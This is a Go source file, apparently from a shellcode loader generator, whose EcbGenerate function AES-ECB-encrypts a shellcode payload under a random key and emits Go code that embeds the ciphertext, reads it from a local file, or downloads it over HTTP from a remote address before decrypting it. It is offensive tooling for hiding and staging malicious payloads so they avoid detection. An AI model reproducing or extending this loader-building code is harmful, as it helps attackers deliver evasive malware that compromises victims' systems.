package encode

import (
	"bytes"
	_ "embed"
	"strconv"
)

var (
	EcbDecrypt = []string{
		`
func f(data []byte, key string) ([]byte) {
		keyLenMap := map[int]struct{}{16: {}, 24: {}, 32: {}}
		if _, ok := keyLenMap[len(key)]; !ok {
		}
		keyByte := []byte(key)
		block, _ := aes.NewCipher(keyByte)
		blockSize := block.BlockSize()
		originByte := data
		decrypted := make([]byte, len(originByte))
		for bs, be := 0, blockSize; bs < len(originByte); bs, be = bs+blockSize, be+blockSize {
			block.Decrypt(decrypted[bs:be], originByte[bs:be])
		}
		return PKCS7UNPadding(decrypted)
	}
	func PKCS7UNPadding(originDataByte []byte) []byte {
		length := len(originDataByte)
		unpadding := int(originDataByte[length-1])
		return originDataByte[:(length-unpadding)]
	}
		`,
		`
		"crypto/aes"
		`, `
        "crypto/aes"
		"io/ioutil"
		`, `
		"crypto/aes"
		"net/http"
		"io/ioutil"
		`,
	}
)

func EcbGenerate(byteData []byte, sepMode, sepSrc string) string {
	randomKey, _ := GenerateRandomString(32)                    //随机生成key
	encryptShellcode, _ := AesEncryptByECB(byteData, randomKey) //进行加密处理
	// 进行替换并传入参数
	hexString := byteSliceToHexString(encryptShellcode)
	switch sepMode {
	case "default":
		byteString := "byteSlice :=" + hexString + "\n\t" + "byteSlice = f(byteSlice,\"" + randomKey + "\")\n\t"
		return byteString
	case "Local Separate":
		// 创建一个文件来写入加密的数据
		CreateSeprarteLocalFile(encryptShellcode, sepSrc)
		byteString := "byteSlice, _ := ioutil.ReadFile(\"" + sepSrc + "\")" + "\n\t" + "byteSlice = f(byteSlice,\"" + randomKey + "\")\n\t"
		return byteString
	case "Remote Separate":
		// 创建一个文件来写入加密的数据 存储到本地,使用时需要重命名
		CreateSeprarteLocalFile(encryptShellcode, "sc.ini")
		byteString := `res, _ := http.Get("` + sepSrc + `")
					byteSlice, _ := ioutil.ReadAll(res.Body) 
					byteSlice = f(byteSlice,` + "\"" + randomKey + "\"" + `)`
		return byteString
	}
	return "Error"
}

func byteSliceToHexString(byteSlice []byte) string {
	var buf bytes.Buffer
	buf.WriteString("[]byte{")
	for i, b := range byteSlice {
		if i > 0 {
			buf.WriteString(", ")
		}
		buf.WriteString("0x")
		buf.WriteString(strconv.FormatUint(uint64(b), 16))
	}
	buf.WriteString("}")
	return buf.String()
}
